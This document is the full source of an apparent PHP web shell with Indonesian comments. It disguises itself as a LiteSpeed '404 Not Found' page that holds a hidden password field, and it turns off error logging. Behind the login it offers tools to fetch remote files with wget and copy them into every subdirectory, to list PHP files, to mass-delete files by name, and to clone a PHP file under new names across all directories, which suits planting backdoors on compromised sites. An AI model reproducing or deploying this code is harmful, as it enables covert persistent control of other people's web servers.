<?php
session_start();
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);


/* Configuration */
/* Password using md5 hashes */
$password = "7ff9e9e716e71e02c30d166f5794cc04"; //ysfislmy
$default_action = "FilesMan";
$default_use_ajax = true;
$default_charset = 'UTF-8';
date_default_timezone_set("Asia/Jakarta");
function login_account()
{
?>

	
<html style="height:100%">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
<title> 404 Not Found
</title><style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style></head>
<body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
<div style="height:auto; min-height:100%; ">     <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
<h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">404</h1>
<h2 style="margin-top:20px;font-size: 30px;">Not Found
</h2>
<p>The resource requested could not be found on this server!</p>
<form method="post"><input style="margin:100;margin-left: 100%;background-color:#fff;border:1px solid #fff;" type="password" name="pass"></form>
</div></div><div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">
<br>Proudly powered by LiteSpeed Web Server<p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p></div></body></html>
<?php
    exit;
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
        login_account();
    }
}
// Mulai sesi
session_start();

// Variabel untuk menangani pesan
$error = '';
$successMessage = '';
$results = [];
$successPaths = [];
$phpFileList = [];
$deletedFileList = [];

// Fungsi untuk menangani pemindaian dan pengaturan izin file
if (isset($_POST['scan'])) {
    $baseDir = $_POST['baseDir'];
    $permissions = $_POST['permissions'];

    if (!is_dir($baseDir)) {
        $error = 'Direktori tidak ditemukan.';
    } else {
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($baseDir));
        foreach ($iterator as $file) {
            if ($file->isFile() && substr(sprintf('%o', $file->getPerms()), -4) != $permissions) {
                $results[] = $file->getPathname() . ' - ' . sprintf('%o', $file->getPerms());
            }
        }
        if (empty($results)) {
            $successMessage = 'Semua file sudah sesuai izin.';
        } else {
            $successMessage = 'Pemindaian selesai.';
        }
    }
}

// Fungsi untuk menangani unduhan file menggunakan wget dan menyebarkan ke semua subdirektori
if (isset($_POST['download'])) {
    $url = $_POST['url'];
    $filename = $_POST['filename'] ?: basename($url);
    $destinationDir = $_POST['destinationDir'] ?: __DIR__; // Default ke direktori saat ini jika tidak ada input

    // Validasi apakah URL valid
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        $error = 'URL tidak valid.';
    } elseif (!is_dir($destinationDir)) {
        $error = 'Direktori tujuan tidak ditemukan.';
    } else {
        // Membangun path file tujuan
        $destination = rtrim($destinationDir, '/') . '/' . $filename;

        // Perintah wget untuk mengunduh file ke path yang ditentukan
        $command = "wget -O " . escapeshellarg($destination) . " " . escapeshellarg($url);

        // Eksekusi perintah wget
        $output = shell_exec($command);

        // Cek apakah file berhasil diunduh
        if (file_exists($destination)) {
            $successMessage = 'Unduhan selesai. File tersimpan di ' . htmlspecialchars($destination);
            $successPaths[] = $destination;

            // Sebarkan file ke semua subdirektori
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($destinationDir, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );

            foreach ($iterator as $dir) {
                if ($dir->isDir()) {
                    $subdirPath = $dir->getPathname();
                    // Salin file ke subdirektori
                    copy($destination, $subdirPath . '/' . $filename);
                }
            }
            $successMessage .= ' File berhasil disebarkan ke semua subdirektori.';
        } else {
            $error = 'Gagal mengunduh file.';
        }
    }
}



// Fungsi untuk menangani pemindaian file PHP dengan tambahan fitur filter dan waktu edit
if (isset($_POST['scan_php'])) {
    $baseDirPhp = $_POST['baseDirPhp'];
    $sortOrder = $_POST['sortOrder'] ?? 'desc'; // Default ke 'desc' (terbaru ke terlama)

    if (!is_dir($baseDirPhp)) {
        $error = 'Direktori tidak ditemukan.';
    } else {
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($baseDirPhp));
        foreach ($iterator as $file) {
            if ($file->isFile() && pathinfo($file->getFilename(), PATHINFO_EXTENSION) === 'php') {
                $filePath = $file->getPathname();
                
                // Membangun URL valid
                $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $filePath);
                $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$relativePath";
                
                // Tambahkan informasi file dalam array phpFileList
                $phpFileList[] = [
                    'path' => $filePath,
                    'last_modified' => filemtime($filePath), // Waktu terakhir file diedit
                    'url' => $url // URL valid untuk membuka file
                ];
            }
        }

        if (empty($phpFileList)) {
            $successMessage = 'Tidak ada file PHP ditemukan.';
        } else {
            // Sortir file berdasarkan waktu edit
            usort($phpFileList, function($a, $b) use ($sortOrder) {
                return $sortOrder === 'asc' ? $a['last_modified'] - $b['last_modified'] : $b['last_modified'] - $a['last_modified'];
            });

            $successMessage = 'Pemindaian selesai.';
        }
    }
}


// Fungsi untuk menangani penghapusan file
if (isset($_POST['auto_rm'])) {
    $baseDirRm = $_POST['baseDirRm'];
    $filenameRm = $_POST['filenameRm'];

    if (!is_dir($baseDirRm)) {
        $error = 'Direktori tidak ditemukan.';
    } else {
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($baseDirRm));
        foreach ($iterator as $file) {
            if ($file->isFile() && basename($file->getFilename()) === $filenameRm) {
                if (unlink($file->getPathname())) {
                    $deletedFileList[] = $file->getPathname();
                } else {
                    $error = 'Gagal menghapus file.';
                }
            }
        }
        if (empty($deletedFileList)) {
            $successMessage = 'File tidak ditemukan untuk dihapus.';
        } else {
            $successMessage = 'Penghapusan selesai.';
        }
    }
}


// Handle PHP file copying and renaming
if (isset($_POST['copyRenameSubmit'])) {
    $sourceFilePath = $_POST['sourceFilePath'];
    $destinationDir = $_POST['destinationDir'];
    $newFileNames = array_filter($_POST['newFileName'], function($value) { return !empty($value); });
    $copiedFilesUrls = [];  // Array to store URLs

    if (!file_exists($sourceFilePath) || !is_file($sourceFilePath)) {
        $error = "The source file does not exist.";
    } elseif (!is_dir($destinationDir)) {
        $error = "The destination directory does not exist.";
    } elseif (empty($newFileNames)) {
        $error = "No new file names provided.";
    } else {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($destinationDir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );

        foreach ($iterator as $dir) {
            if ($dir->isDir()) {
                foreach ($newFileNames as $newFileName) {
                    $newFilePath = $dir->getPathname() . DIRECTORY_SEPARATOR . $newFileName;
                    if (copy($sourceFilePath, $newFilePath)) {
                        // Generate URL for the copied file
                        $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $newFilePath);
                        $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$relativePath";
                        $copiedFilesUrls[] = $url;
                    } else {
                        $error = "Failed to copy file to $newFilePath.";
                        break 2; // Exit both loops if an error occurs
                    }
                }
            }
        }

        if (empty($error)) {
            $successMessage = "Files have been successfully copied and renamed across all directories.";
        }
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tool Manajemen File</title>
    <style>
        /* Style Default (Terang) */
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: url('https://upload.wikimedia.org/wikipedia/commons/b/b9/Circle_reflect_wikipedia.jpg') no-repeat center center fixed;
            background-size: cover;
            color: #333;
            transition: background-color 0.3s, color 0.3s;
        }
        .container {
            max-width: 900px;
            margin: 40px auto;
            background: #ffffff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            transition: background-color 0.3s, color 0.3s;
        }
        h1 {
            text-align: center;
            color: #190454; /* Warna kuning cerah seperti bendera Jolly Roger */
            font-family: 'Comic Sans MS', cursive;
            font-size: 2.5em;
            margin-bottom: 20px;
        }
        .logo {
            display: block;
            margin: 0 auto 20px;
            max-width: 150px;
        }
        .nav-tabs {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }
        .nav-tabs button {
            background-color: #8465DC; /* Warna kuning keemasan dari bendera Jolly Roger */
            color: #000; /* Warna teks hitam untuk kontras */
            border: 2px solid #260683; /* Garis pinggir warna emas */
            padding: 12px 24px;
            margin: 0 10px;
            border-radius: 30px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            transition: background-color 0.3s, transform 0.3s, box-shadow 0.3s;
        }
        .nav-tabs button.active {
            background-color: #260683; /* Warna tombol aktif lebih cerah */
            color: #000;
            transform: scale(1.05);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        }
        .tab-content {
            display: none;
        }
        .tab-content.active {
            display: block;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #555;
        }
        .form-group input, .form-group textarea {
            width: 100%;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid #ddd;
            box-sizing: border-box;
        }
        .form-group textarea {
            height: 160px;
            resize: vertical;
        }
        .button {
            display: block;
            width: 100%;
            padding: 15px;
            font-size: 18px;
            color: #000;
            background-color: #8465DC; /* Warna kuning keemasan dari bendera Jolly Roger */
            border: 2px solid #260683; /* Garis pinggir warna emas */
            border-radius: 30px;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            margin-top: 20px;
            transition: background-color 0.3s, transform 0.3s, box-shadow 0.3s;
        }
        .button:hover {
            background-color: #260683; /* Warna tombol saat hover lebih cerah */
            color: #000;
            transform: scale(1.05);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        }
        .message {
            margin-top: 20px;
            font-weight: bold;
            text-align: center;
        }
        .error {
            color: #e74c3c;
        }
        .success {
            color: #2ecc71;
        }
        .path-list ul, .php-file-list ul, .deleted-file-list ul {
            list-style-type: none;
            padding: 0;
        }
        .path-list li, .php-file-list li, .deleted-file-list li {
            padding: 5px 0;
        }

        /* Mode Gelap */
        body.dark-mode {
            background-color: #333;
            color: #ccc;
        }
        body.dark-mode .container {
            background-color: #444;
            color: #ccc;
        }
        body.dark-mode .nav-tabs button {
            background-color: #555;
            color: #ccc;
        }
        body.dark-mode .nav-tabs button.active {
            background-color: #666;
        }
        body.dark-mode .form-group input, body.dark-mode .form-group textarea {
            background-color: #666;
            border: 1px solid #555;
            color: #ccc;
        }
        body.dark-mode .button {
            background-color: #555;
        }
        body.dark-mode .button:hover {
            background-color: #666;
        }
        body.dark-mode .message.error {
            color: #e74c3c;
        }
        body.dark-mode .message.success {
            color: #2ecc71;
        }
    </style>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const toggleButton = document.getElementById('theme-toggle');
            const currentTheme = localStorage.getItem('theme') || 'light';

            // Apply the saved theme
            if (currentTheme === 'dark') {
                document.body.classList.add('dark-mode');
            }

            // Handle theme toggle button click
            toggleButton.addEventListener('click', () => {
                document.body.classList.toggle('dark-mode');
                const newTheme = document.body.classList.contains('dark-mode') ? 'dark' : 'light';
                localStorage.setItem('theme', newTheme);
            });
        });

        function showTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(function(content) {
                content.classList.remove('active');
            });
            document.querySelectorAll('.nav-tabs button').forEach(function(button) {
                button.classList.remove('active');
            });
            document.getElementById(tabId).classList.add('active');
            document.querySelector('[data-tab="' + tabId + '"]').classList.add('active');
        }

        function copyToClipboard(text) {
            const textarea = document.createElement('textarea');
            textarea.value = text;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
        }

        function copyResults(tabId) {
            const content = document.getElementById(tabId).innerText;
            copyToClipboard(content);
            alert('Hasil telah disalin ke clipboard!');
        }
    </script>
</head>
<body>
    <div class="container">
        <!-- Logo -->
        <img src="https://e7.pngegg.com/pngimages/10/691/png-clipart-wikimania-wikipedia-logo-wikimedia-foundation-wikipedia-logo-text-logo-thumbnail.png" alt="Logo" class="logo">

        <h1>Tool Manajemen File</h1>
        <button id="theme-toggle" style="position: fixed; top: 20px; right: 20px; padding: 10px 20px; border: none; border-radius: 5px; background-color: #190454; color: #000; cursor: pointer;">Toggle Mode</button>
        <div class="nav-tabs">
            <button data-tab="fileScanner" onclick="showTab('fileScanner')" class="active">Pemindai & Pengatur Izin File</button>
            <button data-tab="fileDownloader" onclick="showTab('fileDownloader')">Unduhan</button>
            <button data-tab="phpFileScanner" onclick="showTab('phpFileScanner')">Pemindai File PHP</button>
            <button data-tab="autoRm" onclick="showTab('autoRm')">Auto RM</button>
            <button data-tab="copyRenameTab" onclick="showTab('copyRenameTab')">Copy & Rename PHP</button>
        </div>

        <!-- Pemindai & Pengatur Izin File Tab -->
        <div id="fileScanner" class="tab-content active">
            <form action="" method="post">
                <div class="form-group">
                    <label for="baseDir">Direktori Root:</label>
                    <input type="text" id="baseDir" name="baseDir" value="<?php echo htmlspecialchars(isset($_POST['baseDir']) ? $_POST['baseDir'] : $_SERVER['DOCUMENT_ROOT']); ?>" required>
                </div>
                <div class="form-group">
                    <label for="permissions">Izin File (format 0644, 0755, dll.):</label>
                    <input type="text" id="permissions" name="permissions" value="<?php echo htmlspecialchars(isset($_POST['permissions']) ? $_POST['permissions'] : '0644'); ?>" required>
                </div>
                <button type="submit" name="scan" class="button">Mulai Pemindaian</button>
            </form>
            <button onclick="copyResults('fileScanner')" class="button">Salin Semua</button>
            <?php if ($error && !$successMessage): ?>
                <div class="message error"><?php echo htmlspecialchars($error); ?></div>
            <?php elseif ($results): ?>
                <div class="message success">
                    <h3>Hasil Pemindaian:</h3>
                    <ul>
                        <?php foreach ($results as $result): ?>
                            <li><?php echo htmlspecialchars($result); ?></li>
                        <?php endforeach; ?>
                    </ul>
                </div>
            <?php endif; ?>
        </div>

        <!-- Unduhan Tab -->
<div id="fileDownloader" class="tab-content">
    <form action="" method="post">
        <div class="form-group">
            <label for="url">URL Unduhan:</label>
            <input type="text" id="url" name="url" value="<?php echo htmlspecialchars(isset($_POST['url']) ? $_POST['url'] : ''); ?>" required>
        </div>
        <div class="form-group">
            <label for="filename">Nama File (Opsional, kosongkan jika tidak ingin mengubah nama):</label>
            <input type="text" id="filename" name="filename" value="<?php echo htmlspecialchars(isset($_POST['filename']) ? $_POST['filename'] : ''); ?>">
        </div>
        <div class="form-group">
            <label for="destinationDir">Direktori Tujuan Unduhan:</label>
            <input type="text" id="destinationDir" name="destinationDir" value="<?php echo htmlspecialchars(isset($_POST['destinationDir']) ? $_POST['destinationDir'] : __DIR__); ?>">
        </div>
        <button type="submit" name="download" class="button">Jalankan Unduhan dan Sebarkan</button>
    </form>

    <!-- Copy Button -->
    <button onclick="copyResults('fileDownloader')" class="button">Salin Semua</button>

    <!-- Error or Success Messages -->
    <?php if ($error && !$successMessage): ?>
        <div class="message error"><?php echo htmlspecialchars($error); ?></div>
    <?php elseif ($successMessage): ?>
        <div class="message success"><?php echo htmlspecialchars($successMessage); ?></div>
        <?php if ($successPaths): ?>
            <div class="path-list">
                <h2>File yang Berhasil Diunduh dan Disebarkan:</h2>
                <ul>
                    <?php foreach ($successPaths as $path): ?>
                        <li><?php echo htmlspecialchars($path); ?></li>
                    <?php endforeach; ?>
                </ul>
            </div>
        <?php endif; ?>
    <?php endif; ?>
</div>



        <!-- Pemindai File PHP Tab -->
<div id="phpFileScanner" class="tab-content">
    <form action="" method="post">
        <div class="form-group">
            <label for="baseDirPhp">Direktori Root:</label>
            <input type="text" id="baseDirPhp" name="baseDirPhp" value="<?php echo htmlspecialchars(isset($_POST['baseDirPhp']) ? $_POST['baseDirPhp'] : $_SERVER['DOCUMENT_ROOT']); ?>" required>
        </div>
        <div class="form-group">
            <label for="sortOrder">Urutkan Berdasarkan Waktu Edit:</label>
            <select id="sortOrder" name="sortOrder">
                <option value="desc" <?php echo (isset($_POST['sortOrder']) && $_POST['sortOrder'] == 'desc') ? 'selected' : ''; ?>>Terbaru ke Terlama</option>
                <option value="asc" <?php echo (isset($_POST['sortOrder']) && $_POST['sortOrder'] == 'asc') ? 'selected' : ''; ?>>Terlama ke Terbaru</option>
            </select>
        </div>
        <button type="submit" name="scan_php" class="button">Mulai Pemindaian PHP</button>
    </form>
    <button onclick="copyResults('phpFileScanner')" class="button">Salin Semua</button>

    <?php if ($error && !$successMessage): ?>
        <div class="message error"><?php echo htmlspecialchars($error); ?></div>
    <?php elseif ($successMessage): ?>
        <div class="message success"><?php echo htmlspecialchars($successMessage); ?></div>

        <?php if ($phpFileList): ?>
            <div class="php-file-list">
                <h2>Daftar File PHP:</h2>
                <ul>
                    <?php foreach ($phpFileList as $file): ?>
                        <li>
                            <!-- Link valid untuk membuka file di tab baru -->
                            <a href="<?php echo htmlspecialchars($file['url']); ?>" target="_blank"><?php echo htmlspecialchars($file['path']); ?></a>
                            <br>
                            <!-- Menampilkan waktu terakhir file diedit -->
                            <small>Waktu terakhir diedit: <?php echo date("Y-m-d H:i:s", $file['last_modified']); ?></small>
                        </li>
                    <?php endforeach; ?>
                </ul>
            </div>
        <?php endif; ?>
    <?php endif; ?>
</div>


        <!-- Auto RM Tab -->
        <div id="autoRm" class="tab-content">
            <form action="" method="post">
                <div class="form-group">
                    <label for="baseDirRm">Direktori Root:</label>
                    <input type="text" id="baseDirRm" name="baseDirRm" value="<?php echo htmlspecialchars(isset($_POST['baseDirRm']) ? $_POST['baseDirRm'] : $_SERVER['DOCUMENT_ROOT']); ?>" required>
                </div>
                <div class="form-group">
                    <label for="filenameRm">Nama File untuk Dihapus:</label>
                    <input type="text" id="filenameRm" name="filenameRm" value="<?php echo htmlspecialchars(isset($_POST['filenameRm']) ? $_POST['filenameRm'] : ''); ?>" required>
                </div>
                <button type="submit" name="auto_rm" class="button">Hapus File</button>
            </form>
            <button onclick="copyResults('autoRm')" class="button">Salin Semua</button>
            <?php if ($error && !$successMessage): ?>
                <div class="message error"><?php echo htmlspecialchars($error); ?></div>
            <?php elseif ($successMessage): ?>
                <div class="message success"><?php echo htmlspecialchars($successMessage); ?></div>
                <?php if ($deletedFileList): ?>
                    <div class="deleted-file-list">
                        <h2>File yang Dihapus:</h2>
                        <ul>
                            <?php foreach ($deletedFileList as $file): ?>
                                <li><?php echo htmlspecialchars($file); ?></li>
                            <?php endforeach; ?>
                        </ul>
                    </div>
                <?php endif; ?>
            <?php endif; ?>
        </div>
<!-- Copy and Rename PHP Files Tab -->
<div id="copyRenameTab" class="tab-content">
    <form action="" method="post">
        <div class="form-group">
            <label for="sourceFilePath">Source PHP File Path:</label>
            <input type="text" id="sourceFilePath" name="sourceFilePath" required>
        </div>
        <div class="form-group">
            <label for="destinationDir">Destination Directory Path:</label>
            <input type="text" id="destinationDir" name="destinationDir" required>
        </div>
        <div class="form-group">
            <label>Enter New File Names:</label>
            <?php for ($i = 0; $i < 5; $i++): ?>
            <input type="text" name="newFileName[]" placeholder="New file name <?= $i + 1 ?>">
            <?php endfor; ?>
        </div>
        <button type="submit" name="copyRenameSubmit" class="button">Copy and Rename</button>
    </form>
    <?php if (!empty($successMessage)): ?>
        <div class="message success"><?= htmlspecialchars($successMessage); ?></div>
        <h3>Copied Files URLs:</h3>
        <ul>
            <?php foreach ($copiedFilesUrls as $url): ?>
                <li><a href="<?= htmlspecialchars($url) ?>" target="_blank"><?= htmlspecialchars($url) ?></a></li>
            <?php endforeach; ?>
        </ul>
        <button onclick="copyToClipboard('<?= implode("\n", $copiedFilesUrls) ?>')">Copy URLs</button>
    <?php endif; ?>
    <?php if (!empty($error)): ?>
        <div class="message error"><?= htmlspecialchars($error); ?></div>
    <?php endif; ?>
</div>

<script>
function copyToClipboard(text) {
    const textarea = document.createElement('textarea');
    textarea.value = text;
    document.body.appendChild(textarea);
    textarea.select();
    document.execCommand('copy');
    document.body.removeChild(textarea);
    alert('URLs copied to clipboard!');
}
</script>
    </div>
</body>
</html>
